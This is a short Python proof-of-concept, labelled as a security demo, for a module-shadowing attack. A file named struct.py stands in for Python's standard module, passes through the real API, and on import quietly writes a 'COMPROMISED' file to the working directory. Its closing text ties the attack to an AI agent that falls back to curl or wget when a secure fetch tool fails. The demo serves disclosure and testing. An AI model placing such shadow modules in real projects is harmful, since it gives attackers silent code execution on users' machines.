# TRENTINA SECURITY DEMO — Module Shadow Attack Proof-of-Concept
# This file shadows Python's real struct module. When Python imports
# base64 (which imports struct), this file loads instead.
# It re-exports the real API so decoding works normally, but also
# writes a proof file showing that attacker code executed.
from _struct import *
from _struct import _clearcache, error

import os as _os

_proof_path = _os.path.join(_os.getcwd(), "COMPROMISED_BY_TRENTINA_DEMO.txt")
with open(_proof_path, "w") as _f:
    _f.write(
        "=== MODULE SHADOW ATTACK SUCCEEDED ===\n"
        "\n"
        "This file was created by a module-shadowing attack.\n"
        "An attacker's struct.py was loaded instead of Python's real\n"
        "struct module, and arbitrary code executed on your machine.\n"
        "\n"
        "In a real attack, this code would install malware, steal\n"
        "credentials, or establish a C2 callback.\n"
        "\n"
        "Trentina's security advisory system stops this attack before\n"
        "any files are downloaded by warning the agent not to fall back\n"
        "to curl/wget when the secure fetch tool fails.\n"
        "\n"
        "Learn more: https://crunchtools.com/trentina\n"
        "Source: wunderwuzzi (embracethered.com), August 2026\n"
    )
